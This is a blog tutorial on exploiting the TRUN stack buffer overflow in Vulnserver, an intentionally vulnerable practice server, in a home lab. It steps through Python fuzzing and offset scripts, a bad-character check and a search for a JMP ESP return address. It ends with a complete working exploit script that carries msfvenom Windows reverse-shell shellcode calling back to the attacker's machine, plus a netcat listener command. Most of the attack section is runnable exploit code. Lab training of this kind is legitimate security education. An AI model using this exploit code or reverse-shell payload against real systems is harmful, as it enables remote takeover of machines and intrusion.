---
title: "Vulnserver - Stack Based Buffer Overflow"
date: 2020-01-19 
header:  
excerpt: "Vulnserver - Stack Based Buffer Overflow"
---

##  Intro

Vulnserver is an intentionally vulnerable software that can be found from [thegreycorner's blog](http://www.thegreycorner.com/p/vulnserver.html) or alternatively on their [GitHub](https://github.com/stephenbradshaw/vulnserver).

The software has multiple different Buffer Overflow vulnerabilities of which the Stack Based Buffer Overflow using the TRUN command is the simplest.

To practice exploiting the software we need the following
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Kali](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* [Mona.py](https://github.com/corelan/mona)
* Vulnserver
* Windows 10 (**32-Bit**)

## Setup

I will be using [VMware Workstation pro](https://my.vmware.com/en/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/15_0), you could alternatively use [VirtualBox](https://www.virtualbox.org/wiki/Downloads) which is free. Select the version  based on your operating system e.g. Windows.
After downloading the preferred Virtualization platform we need to create the two Virtual Machines Windows & Kali.

After creating the VMs, start up Windows VM and download vulnserver, immunity debugger & mona.

### Setting up Immunity Debugger

Download [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py), before you can download the site asks you to
fill the form, you can put random information in the fields.

![immu1](/images/vulnserver/stack/immu1.PNG)

Install Immunity Debugger and when the installer asks to install python 2.7.1 allow the installation.
After the installation is complete download [mona](https://github.com/corelan/mona) and copy the mona.py over to the
Pycommands folder inside Immunity Debugger. In this case **C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands**

![mona1](/images/vulnserver/stack/mona1.PNG)

You can now open Immunity Debugger by right clicking the shortcut and "run as administrator"

![immu2](/images/vulnserver/stack/immu2.PNG)

### Setting up Vulnserver

Download the Vulnserver software and extract it somewhere where it is easy to access such as the Desktop.

![vuln1](/images/vulnserver/stack/vuln1.PNG)

In the vulnserver folder there a few files, start the vulnserver.exe by right clicking it and "run as administrator"

![vuln2](/images/vulnserver/stack/vuln2.PNG)


You now have vulnserver up and running

![vuln3](/images/vulnserver/stack/vuln3.PNG)


## Exploiting TRUN Command

Now that we have basic setup done, we can start exploiting vulnserver via the TRUN command. First we can connect  to the
server using netcat, by default vulnserver listens on port 9999. Connect with **nc -v Windows VM IP 9999**, we can also list
the commands by issuing the command **HELP** after connecting.

![exp1](/images/vulnserver/stack/exp1.PNG)

First we create a fuzzing script with python that we can use to crash vulnserver. An example code could be something like

```python
#!/usr/bin/python
import sys, socket
from time import sleep

host = "192.168.209.133"
port = 9999

buffer = "A" * 100

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100

         except:
                 print "Fuzzing crashed at %s bytes" % str(len(buffer))
                 sys.exit()
```

After running the python code, we can check Immunity Debugger and in a few moments we can see that the program has crashed with
access violation and execution of the program is paused, which is good (note since I'm using Windows 10 older versions may act differently).

![exp2](/images/vulnserver/stack/exp2.PNG)

Looking at our fuzzing script we can see that the crash occured around 2400 bytes

![exp3](/images/vulnserver/stack/exp3.PNG)

Next we have to create an unique string to find the offset - or where the crash actually happened within the 2400 bytes using the pattern_create.rb tool included in the metasploit-framework,
**/usr/share/metasploit-framework/tools/exploit/pattern_create.rb** specify the length of the string the -l flag e.g. -l 2400

![exp4](/images/vulnserver/stack/exp4.PNG)

Next we edit the initial python script to include our pattern and send it to the server. The code should look something like

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + offset))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
        
```

After executing the script, we can note that the server has crashed and we can see our EIP offset is 386F4337

![exp5](/images/vulnserver/stack/exp5.PNG)

Now that we have our EIP we can use another metasploit-framework tool named pattern_offset located at
**/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb** specify the same length as previously with
the -l flag e.g. -l 2400 and use the flag -q to include our EIP 386F4337 e.g. -g 386F4337

![exp6](/images/vulnserver/stack/exp6.PNG)

We have our offset at 2003 bytes.

Now that we have our offset lets modify the python script to include the offset

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999

shellcode = "A" * 2003 + "B" * 4
while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
        
```

Here we added a new variable `shellcode` in which we included the following
* "A" * 2003 - this is our offset
* "B" * 4 - These should show up in EIP and we know we can control it


Next we execute the python script and check Immunity and we can see that we have overwritten the EIP with **42424242** which is 
hexadecimal value for "BBBB" and it means we have control over the EIP

![exp7](/images/vulnserver/stack/exp7.PNG)

### Bad Characters

What are bad characters? Bad characters or badchars are characters that would break our malicious code from executing byte
breaking or otherwise mangling the code string we send to the application. We don't know the badchars before hand but in general **\x00** or null byte is always considered bad.

```

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

```
[Found from bulbsecurity.com](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
Now we edit our python script to include the badchars, I also removed the **\x00** character. The code should look something like

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
```

Excuting the script and looking at Immunity we can see that again we crashed the program and overwrote EIP with 42424242, but to check
for badchars we can right click on ESP value and click "Follow in Dump"

![exp8](/images/vulnserver/stack/exp8.PNG)

In the hex dump we can see all the characters we send to vulnserver starting from "01" or "\x01" all the way to "ff" or "\xff".

![exp9](/images/vulnserver/stack/exp9.PNG)

None of the characters are mangled in any way, this could be indicated with e.g. "01" being replaced by "b0" which would mean that
"01" would be a bad character.

### Finding Module

Finding module means that we need to find a usable module that would allow us to execute our maliciosu code. The module can't
have memory potections enabled such as DEB, ASLR, SafeSEH etc. Now there are ways to bypass these but that is out-of-scope. We can do this by using
the mona module we installed during the setup.

In Immunity type **!mona modules** on the search bar and press enter

![exp10](/images/vulnserver/stack/exp10.PNG)

Following window will appear. Here we are looking for a DLL that is attached to vulnserver, and we should see one named **essfunc.dll** that has all of the
memory protections set to **false**

![exp11](/images/vulnserver/stack/exp11.PNG)

Now that we found our module, we need to figure out the jmp esp or jump pointer to ESP that tells the program to jump to the address
stored in the ESP register and resume execution. This can be googled but we can again use metasploit-framework to do it for us using nasm_shell
**/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb**

![exp12](/images/vulnserver/stack/exp12.PNG)

We now know the JMP ESP opcode equilevant is FFE4 in hexadecimal. Going back to Immunity we need to search for the JMP ESP instruction in the essc.dll module. This can be with the mona module
by typing **!mona find -s "\xff\xe4" -m essfunc.dll**

![exp13](/images/vulnserver/stack/exp13.PNG)

The following window appears, we can see that there are total of 9 valid return addresses and they do not have ASLR enabled.

![exp14](/images/vulnserver/stack/exp14.PNG)

We cam now choose whichever return address we'd like, in this case 'Ill choose the **625011c7** address. Now we need to edit our python script
by adding the address in it. The code should look something like 

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999


shellcode = "A" * 2003 + "\xc7\x11\x50\x62"

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
```

Take note how we added our return address to the script. Since we are attacking x86 architecture (32-bit) we need to add the
address in litte endian format. Next going back to Immunity we need to add a software breakpoint which will stop the program from executing and
will wait for further instructions when it hits our return address of **625011c7**. To do so click on the arrow highlighted in yellow.

![exp15](/images/vulnserver/stack/exp15.PNG)

New window opens up and input your chosen retrun address, in this case it is **625011c7**

![exp16](/images/vulnserver/stack/exp16.PNG)

The chosen memory address should be chosen and have JMP ESP next to it, then press F2 to set the breakpoint and the address should change color to light blue.

![exp17](/images/vulnserver/stack/exp17.PNG)

Next make sure Immunity is running and then execute the python script. Immunity should crash and EIP should point to the chosen address in this case **625011c7**

![exp18](/images/vulnserver/stack/exp18.PNG)

Now that we know we control the EIP, we can generate a reverse shell.

### Reverse shell

Using msfvenom we can create a reverse shell. Using the command
**msfvenom -p windows/shell_reverse_tcp lhost=kali ip lport= kali port exitfunc=thread -f c -a x86 -b "\x00"**
where
* -p - means payload we want to use
* lhost	- kali ip address
* lport - kali port to listen on
* exitfunc=thread - makes the exploit more reliable
* -f c - filetype for the exploit, in this case it is c
* -a x86 - specifies the architecture
* -b "x\00" - bad characters 

![exp19](/images/vulnserver/stack/exp19.PNG)

Next we add our shellcode to the python script. Note we also add 30 "\x90" or NOPs which stands for NO OPERATION and are basically just padding. The code should look something like

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.209.131 lport=9001 exitfunc=thread -f c -a x86 -b "\x00" 

overflow = ("\xbf\x1c\x70\x43\x21\xd9\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x7b\x0e\x03\x67\x7e\xa1\xd4\x6b\x96\xa7"
"\x17\x93\x67\xc8\x9e\x76\x56\xc8\xc5\xf3\xc9\xf8\x8e\x51\xe6"
"\x73\xc2\x41\x7d\xf1\xcb\x66\x36\xbc\x2d\x49\xc7\xed\x0e\xc8"
"\x4b\xec\x42\x2a\x75\x3f\x97\x2b\xb2\x22\x5a\x79\x6b\x28\xc9"
"\x6d\x18\x64\xd2\x06\x52\x68\x52\xfb\x23\x8b\x73\xaa\x38\xd2"
"\x53\x4d\xec\x6e\xda\x55\xf1\x4b\x94\xee\xc1\x20\x27\x26\x18"
"\xc8\x84\x07\x94\x3b\xd4\x40\x13\xa4\xa3\xb8\x67\x59\xb4\x7f"
"\x15\x85\x31\x9b\xbd\x4e\xe1\x47\x3f\x82\x74\x0c\x33\x6f\xf2"
"\x4a\x50\x6e\xd7\xe1\x6c\xfb\xd6\x25\xe5\xbf\xfc\xe1\xad\x64"
"\x9c\xb0\x0b\xca\xa1\xa2\xf3\xb3\x07\xa9\x1e\xa7\x35\xf0\x76"
"\x04\x74\x0a\x87\x02\x0f\x79\xb5\x8d\xbb\x15\xf5\x46\x62\xe2"
"\xfa\x7c\xd2\x7c\x05\x7f\x23\x55\xc2\x2b\x73\xcd\xe3\x53\x18"
"\x0d\x0b\x86\x8f\x5d\xa3\x79\x70\x0d\x03\x2a\x18\x47\x8c\x15"
"\x38\x68\x46\x3e\xd3\x93\x01\x81\x8c\x4a\x52\x69\xcf\x6c\x76"
"\x43\x46\x8a\x12\x83\x0e\x05\x8b\x3a\x0b\xdd\x2a\xc2\x81\x98"
"\x6d\x48\x26\x5d\x23\xb9\x43\x4d\xd4\x49\x1e\x2f\x73\x55\xb4"
"\x47\x1f\xc4\x53\x97\x56\xf5\xcb\xc0\x3f\xcb\x05\x84\xad\x72"
"\xbc\xba\x2f\xe2\x87\x7e\xf4\xd7\x06\x7f\x79\x63\x2d\x6f\x47"
"\x6c\x69\xdb\x17\x3b\x27\xb5\xd1\x95\x89\x6f\x88\x4a\x40\xe7"
"\x4d\xa1\x53\x71\x52\xec\x25\x9d\xe3\x59\x70\xa2\xcc\x0d\x74"
"\xdb\x30\xae\x7b\x36\xf1\xce\x99\x92\x0c\x67\x04\x77\xad\xea"
"\xb7\xa2\xf2\x12\x34\x46\x8b\xe0\x24\x23\x8e\xad\xe2\xd8\xe2"
"\xbe\x86\xde\x51\xbe\x82")


shellcode = "A" * 2003 + "\xc7\x11\x50\x62" + "\x90" * 30 + overflow

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
        
```

After modifying the script, create netcat listener with the command **nc -lvnp 9001** and start vulnserver again and finally run the exploit.
Everything done correctly we will get a reverse shell.

![exp20](/images/vulnserver/stack/exp20.PNG)